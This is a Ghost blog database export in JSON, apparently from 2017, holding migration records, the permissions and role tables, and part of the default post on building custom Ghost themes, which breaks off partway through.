{"db":[{"meta":{"exported_on":1506126121559,"version":"1.9.0"},"data":{"app_fields":[],"app_settings":[],"apps":[],"brute":[{"key":"z2z+9RdVUGvXKCQevSNSsCT6za8jyR/U6eZM6MN7puo=","firstRequest":1505545031887,"lastRequest":1505545031887,"lifetime":1518245831893,"count":1},{"key":"e0T2rysYDcb4/p37OXgb/ucwiZ9yZ7lTKpGBjomHhNM=","firstRequest":1506084717060,"lastRequest":1506084717060,"lifetime":1506088317076,"count":1}],"invites":[],"migrations":[{"id":1,"name":"1-create-tables.js","version":"init","currentVersion":"1.8"},{"id":2,"name":"2-create-fixtures.js","version":"init","currentVersion":"1.8"},{"id":3,"name":"1-post-excerpt.js","version":"1.3","currentVersion":"1.8"},{"id":4,"name":"1-codeinjection-post.js","version":"1.4","currentVersion":"1.8"},{"id":5,"name":"1-og-twitter-post.js","version":"1.5","currentVersion":"1.8"},{"id":6,"name":"1-add-backup-client.js","version":"1.7","currentVersion":"1.8"},{"id":7,"name":"1-add-permissions-redirect.js","version":"1.9","currentVersion":"1.9"}],"permissions":[{"id":"59bcc7a4045d4920c17856f2","name":"Export database","object_type":"db","action_type":"exportContent","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c17856f3","name":"Import database","object_type":"db","action_type":"importContent","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c17856f4","name":"Delete all content","object_type":"db","action_type":"deleteAllContent","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c17856f5","name":"Send mail","object_type":"mail","action_type":"send","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c17856f6","name":"Browse notifications","object_type":"notification","action_type":"browse","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c17856f7","name":"Add notifications","object_type":"notification","action_type":"add","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c17856f8","name":"Delete notifications","object_type":"notification","action_type":"destroy","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c17856f9","name":"Browse posts","object_type":"post","action_type":"browse","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c17856fa","name":"Read posts","object_type":"post","action_type":"read","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c17856fb","name":"Edit posts","object_type":"post","action_type":"edit","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c17856fc","name":"Add posts","object_type":"post","action_type":"add","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c17856fd","name":"Delete posts","object_type":"post","action_type":"destroy","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c17856fe","name":"Browse settings","object_type":"setting","action_type":"browse","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c17856ff","name":"Read settings","object_type":"setting","action_type":"read","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785700","name":"Edit settings","object_type":"setting","action_type":"edit","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785701","name":"Generate slugs","object_type":"slug","action_type":"generate","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785702","name":"Browse tags","object_type":"tag","action_type":"browse","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785703","name":"Read tags","object_type":"tag","action_type":"read","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785704","name":"Edit tags","object_type":"tag","action_type":"edit","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785705","name":"Add tags","object_type":"tag","action_type":"add","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785706","name":"Delete tags","object_type":"tag","action_type":"destroy","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785707","name":"Browse themes","object_type":"theme","action_type":"browse","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785708","name":"Edit themes","object_type":"theme","action_type":"edit","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785709","name":"Activate themes","object_type":"theme","action_type":"activate","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c178570a","name":"Upload themes","object_type":"theme","action_type":"add","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c178570b","name":"Download themes","object_type":"theme","action_type":"read","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c178570c","name":"Delete themes","object_type":"theme","action_type":"destroy","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c178570d","name":"Browse users","object_type":"user","action_type":"browse","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c178570e","name":"Read users","object_type":"user","action_type":"read","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c178570f","name":"Edit users","object_type":"user","action_type":"edit","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785710","name":"Add users","object_type":"user","action_type":"add","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785711","name":"Delete users","object_type":"user","action_type":"destroy","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785712","name":"Assign a role","object_type":"role","action_type":"assign","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785713","name":"Browse roles","object_type":"role","action_type":"browse","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785714","name":"Browse clients","object_type":"client","action_type":"browse","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785715","name":"Read clients","object_type":"client","action_type":"read","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785716","name":"Edit clients","object_type":"client","action_type":"edit","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785717","name":"Add clients","object_type":"client","action_type":"add","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785718","name":"Delete clients","object_type":"client","action_type":"destroy","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785719","name":"Browse subscribers","object_type":"subscriber","action_type":"browse","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c178571a","name":"Read subscribers","object_type":"subscriber","action_type":"read","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c178571b","name":"Edit subscribers","object_type":"subscriber","action_type":"edit","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c178571c","name":"Add subscribers","object_type":"subscriber","action_type":"add","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c178571d","name":"Delete subscribers","object_type":"subscriber","action_type":"destroy","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c178571e","name":"Browse invites","object_type":"invite","action_type":"browse","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c178571f","name":"Read invites","object_type":"invite","action_type":"read","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785720","name":"Edit invites","object_type":"invite","action_type":"edit","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785721","name":"Add invites","object_type":"invite","action_type":"add","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c1785722","name":"Delete invites","object_type":"invite","action_type":"destroy","object_id":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59c5088f54d8027b3a02e522","name":"Download redirects","object_type":"redirect","action_type":"download","object_id":null,"created_at":"2017-09-22T12:56:47.000Z","created_by":"1","updated_at":"2017-09-22T12:56:47.000Z","updated_by":"1"},{"id":"59c5088f54d8027b3a02e523","name":"Upload redirects","object_type":"redirect","action_type":"upload","object_id":null,"created_at":"2017-09-22T12:56:47.000Z","created_by":"1","updated_at":"2017-09-22T12:56:47.000Z","updated_by":"1"}],"permissions_apps":[],"permissions_roles":[{"id":"59bcc7a5045d4920c1785724","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c17856f2"},{"id":"59bcc7a5045d4920c1785725","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c17856f3"},{"id":"59bcc7a5045d4920c1785726","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c17856f4"},{"id":"59bcc7a5045d4920c1785727","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c17856f5"},{"id":"59bcc7a5045d4920c1785728","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c17856f6"},{"id":"59bcc7a5045d4920c1785729","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c17856f7"},{"id":"59bcc7a5045d4920c178572a","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c17856f8"},{"id":"59bcc7a5045d4920c178572b","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c17856f9"},{"id":"59bcc7a5045d4920c178572c","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c17856fa"},{"id":"59bcc7a5045d4920c178572d","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c17856fb"},{"id":"59bcc7a5045d4920c178572e","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c17856fc"},{"id":"59bcc7a5045d4920c178572f","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c17856fd"},{"id":"59bcc7a5045d4920c1785730","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c17856fe"},{"id":"59bcc7a5045d4920c1785731","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c17856ff"},{"id":"59bcc7a5045d4920c1785732","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785700"},{"id":"59bcc7a5045d4920c1785733","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785701"},{"id":"59bcc7a5045d4920c1785734","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785702"},{"id":"59bcc7a5045d4920c1785735","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785703"},{"id":"59bcc7a5045d4920c1785736","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785704"},{"id":"59bcc7a5045d4920c1785737","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785705"},{"id":"59bcc7a5045d4920c1785738","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785706"},{"id":"59bcc7a5045d4920c1785739","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785707"},{"id":"59bcc7a5045d4920c178573a","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785708"},{"id":"59bcc7a5045d4920c178573b","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785709"},{"id":"59bcc7a5045d4920c178573c","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c178570a"},{"id":"59bcc7a5045d4920c178573d","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c178570b"},{"id":"59bcc7a5045d4920c178573e","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c178570c"},{"id":"59bcc7a5045d4920c178573f","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c178570d"},{"id":"59bcc7a5045d4920c1785740","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c178570e"},{"id":"59bcc7a5045d4920c1785741","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c178570f"},{"id":"59bcc7a5045d4920c1785742","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785710"},{"id":"59bcc7a5045d4920c1785743","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785711"},{"id":"59bcc7a5045d4920c1785744","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785712"},{"id":"59bcc7a5045d4920c1785745","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785713"},{"id":"59bcc7a5045d4920c1785746","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785714"},{"id":"59bcc7a5045d4920c1785747","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785715"},{"id":"59bcc7a5045d4920c1785748","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785716"},{"id":"59bcc7a5045d4920c1785749","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785717"},{"id":"59bcc7a5045d4920c178574a","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785718"},{"id":"59bcc7a5045d4920c178574b","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785719"},{"id":"59bcc7a5045d4920c178574c","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c178571a"},{"id":"59bcc7a5045d4920c178574d","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c178571b"},{"id":"59bcc7a5045d4920c178574e","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c178571c"},{"id":"59bcc7a5045d4920c178574f","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c178571d"},{"id":"59bcc7a5045d4920c1785750","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c178571e"},{"id":"59bcc7a5045d4920c1785751","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c178571f"},{"id":"59bcc7a5045d4920c1785752","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785720"},{"id":"59bcc7a5045d4920c1785753","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785721"},{"id":"59bcc7a5045d4920c1785754","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59bcc7a4045d4920c1785722"},{"id":"59bcc7a5045d4920c1785755","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c17856f9"},{"id":"59bcc7a5045d4920c1785756","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c17856fa"},{"id":"59bcc7a5045d4920c1785757","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c17856fb"},{"id":"59bcc7a5045d4920c1785758","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c17856fc"},{"id":"59bcc7a5045d4920c1785759","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c17856fd"},{"id":"59bcc7a5045d4920c178575a","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c17856fe"},{"id":"59bcc7a5045d4920c178575b","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c17856ff"},{"id":"59bcc7a5045d4920c178575c","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c1785701"},{"id":"59bcc7a5045d4920c178575d","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c1785702"},{"id":"59bcc7a5045d4920c178575e","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c1785703"},{"id":"59bcc7a5045d4920c178575f","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c1785704"},{"id":"59bcc7a5045d4920c1785760","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c1785705"},{"id":"59bcc7a5045d4920c1785761","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c1785706"},{"id":"59bcc7a5045d4920c1785762","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c178570d"},{"id":"59bcc7a5045d4920c1785763","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c178570e"},{"id":"59bcc7a5045d4920c1785764","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c178570f"},{"id":"59bcc7a5045d4920c1785765","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c1785710"},{"id":"59bcc7a5045d4920c1785766","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c1785711"},{"id":"59bcc7a5045d4920c1785767","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c1785712"},{"id":"59bcc7a5045d4920c1785768","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c1785713"},{"id":"59bcc7a5045d4920c1785769","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c1785714"},{"id":"59bcc7a5045d4920c178576a","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c1785715"},{"id":"59bcc7a5045d4920c178576b","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c1785716"},{"id":"59bcc7a5045d4920c178576c","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c1785717"},{"id":"59bcc7a5045d4920c178576d","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c1785718"},{"id":"59bcc7a5045d4920c178576e","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c178571c"},{"id":"59bcc7a5045d4920c178576f","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c178571e"},{"id":"59bcc7a5045d4920c1785770","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c178571f"},{"id":"59bcc7a5045d4920c1785771","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c1785720"},{"id":"59bcc7a5045d4920c1785772","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c1785721"},{"id":"59bcc7a5045d4920c1785773","role_id":"59bcc7a4045d4920c17856ef","permission_id":"59bcc7a4045d4920c1785722"},{"id":"59bcc7a5045d4920c1785774","role_id":"59bcc7a4045d4920c17856f0","permission_id":"59bcc7a4045d4920c17856f9"},{"id":"59bcc7a5045d4920c1785775","role_id":"59bcc7a4045d4920c17856f0","permission_id":"59bcc7a4045d4920c17856fa"},{"id":"59bcc7a5045d4920c1785776","role_id":"59bcc7a4045d4920c17856f0","permission_id":"59bcc7a4045d4920c17856fc"},{"id":"59bcc7a5045d4920c1785777","role_id":"59bcc7a4045d4920c17856f0","permission_id":"59bcc7a4045d4920c17856fe"},{"id":"59bcc7a5045d4920c1785778","role_id":"59bcc7a4045d4920c17856f0","permission_id":"59bcc7a4045d4920c17856ff"},{"id":"59bcc7a5045d4920c1785779","role_id":"59bcc7a4045d4920c17856f0","permission_id":"59bcc7a4045d4920c1785701"},{"id":"59bcc7a5045d4920c178577a","role_id":"59bcc7a4045d4920c17856f0","permission_id":"59bcc7a4045d4920c1785702"},{"id":"59bcc7a5045d4920c178577b","role_id":"59bcc7a4045d4920c17856f0","permission_id":"59bcc7a4045d4920c1785703"},{"id":"59bcc7a5045d4920c178577c","role_id":"59bcc7a4045d4920c17856f0","permission_id":"59bcc7a4045d4920c1785705"},{"id":"59bcc7a5045d4920c178577d","role_id":"59bcc7a4045d4920c17856f0","permission_id":"59bcc7a4045d4920c178570d"},{"id":"59bcc7a5045d4920c178577e","role_id":"59bcc7a4045d4920c17856f0","permission_id":"59bcc7a4045d4920c178570e"},{"id":"59bcc7a5045d4920c178577f","role_id":"59bcc7a4045d4920c17856f0","permission_id":"59bcc7a4045d4920c1785713"},{"id":"59bcc7a5045d4920c1785780","role_id":"59bcc7a4045d4920c17856f0","permission_id":"59bcc7a4045d4920c1785714"},{"id":"59bcc7a5045d4920c1785781","role_id":"59bcc7a4045d4920c17856f0","permission_id":"59bcc7a4045d4920c1785715"},{"id":"59bcc7a5045d4920c1785782","role_id":"59bcc7a4045d4920c17856f0","permission_id":"59bcc7a4045d4920c1785716"},{"id":"59bcc7a5045d4920c1785783","role_id":"59bcc7a4045d4920c17856f0","permission_id":"59bcc7a4045d4920c1785717"},{"id":"59bcc7a5045d4920c1785784","role_id":"59bcc7a4045d4920c17856f0","permission_id":"59bcc7a4045d4920c1785718"},{"id":"59bcc7a5045d4920c1785785","role_id":"59bcc7a4045d4920c17856f0","permission_id":"59bcc7a4045d4920c178571c"},{"id":"59c5088f54d8027b3a02e524","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59c5088f54d8027b3a02e522"},{"id":"59c5088f54d8027b3a02e525","role_id":"59bcc7a4045d4920c17856ee","permission_id":"59c5088f54d8027b3a02e523"}],"permissions_users":[],"posts":[{"id":"59bcc7a3045d4920c17856e2","uuid":"98ff5382-eec0-4b4a-8292-7f9e3a33d747","title":"Setting up your own Ghost theme","slug":"themes","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Creating a totally custom design for your publication\\n\\nGhost comes with a beautiful default theme called Casper, which is designed to be a clean, readable publication layout and can be easily adapted for most purposes. However, Ghost can also be completely themed to suit your needs. Rather than just giving you a few basic settings which act as a poor proxy for code, we just let you write code.\\n\\nThere are a huge range of both free and premium pre-built themes which you can get from the [Ghost Theme Marketplace](http://marketplace.ghost.org), or you can simply create your own from scratch.\\n\\n[![marketplace](https://casper.ghost.org/v1.0.0/images/marketplace.jpg)](http://marketplace.ghost.org)\\n\\n> Anyone can write a completely custom Ghost theme, with just some solid knowledge of HTML and CSS\\n\\nGhost themes are written with a templating language called handlebars, which has a bunch of dynamic helpers to insert your data into template files. Like `{{author.name}}`, for example, outputs the name of the current author.\\n\\nThe best way to learn how to write your own Ghost theme is to have a look at [the source code for Casper](https://github.com/TryGhost/Casper), which is heavily commented and should give you a sense of how everything fits together.\\n\\n- `default.hbs` is the main template file, all contexts will load inside this file unless specifically told to use a different template.\\n- `post.hbs` is the file used in the context of viewing a post.\\n- `index.hbs` is the file used in the context of viewing the home page.\\n- and so on\\n\\nWe've got [full and extensive theme documentation](http://themes.ghost.org/docs/about) which outlines every template file, context and helper that you can use.\\n\\nIf you want to chat with other people making Ghost themes to get any advice or help, there's also a **#themes** channel in our [public Slack community](https://slack.ghost.org) which we always recommend joining!\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>Creating a totally custom design for your publication</p>\n<p>Ghost comes with a beautiful default theme called Casper, which is designed to be a clean, readable publication layout and can be easily adapted for most purposes. However, Ghost can also be completely themed to suit your needs. Rather than just giving you a few basic settings which act as a poor proxy for code, we just let you write code.</p>\n<p>There are a huge range of both free and premium pre-built themes which you can get from the <a href=\"http://marketplace.ghost.org\">Ghost Theme Marketplace</a>, or you can simply create your own from scratch.</p>\n<p><a href=\"http://marketplace.ghost.org\"><img src=\"https://casper.ghost.org/v1.0.0/images/marketplace.jpg\" alt=\"marketplace\"></a></p>\n<blockquote>\n<p>Anyone can write a completely custom Ghost theme, with just some solid knowledge of HTML and CSS</p>\n</blockquote>\n<p>Ghost themes are written with a templating language called handlebars, which has a bunch of dynamic helpers to insert your data into template files. Like <code>{{author.name}}</code>, for example, outputs the name of the current author.</p>\n<p>The best way to learn how to write your own Ghost theme is to have a look at <a href=\"https://github.com/TryGhost/Casper\">the source code for Casper</a>, which is heavily commented and should give you a sense of how everything fits together.</p>\n<ul>\n<li><code>default.hbs</code> is the main template file, all contexts will load inside this file unless specifically told to use a different template.</li>\n<li><code>post.hbs</code> is the file used in the context of viewing a post.</li>\n<li><code>index.hbs</code> is the file used in the context of viewing the home page.</li>\n<li>and so on</li>\n</ul>\n<p>We've got <a href=\"http://themes.ghost.org/docs/about\">full and extensive theme documentation</a> which outlines every template file, context and helper that you can use.</p>\n<p>If you want to chat with other people making Ghost themes to get any advice or help, there's also a <strong>#themes</strong> channel in our <a href=\"https://slack.ghost.org\">public Slack community</a> which we always recommend joining!</p>\n</div>","amp":null,"plaintext":"Creating a totally custom design for your publication\n\nGhost comes with a beautiful default theme called Casper, which is designed to\nbe a clean, readable publication layout and can be easily adapted for most\npurposes. However, Ghost can also be completely themed to suit your needs.\nRather than just giving you a few basic settings which act as a poor proxy for\ncode, we just let you write code.\n\nThere are a huge range of both free and premium pre-built themes which you can\nget from the Ghost Theme Marketplace [http://marketplace.ghost.org], or you can\nsimply create your own from scratch.\n\n  [http://marketplace.ghost.org]\n\nAnyone can write a completely custom Ghost theme, with just some solid knowledge\nof HTML and CSS\n\nGhost themes are written with a templating language called handlebars, which has\na bunch of dynamic helpers to insert your data into template files. 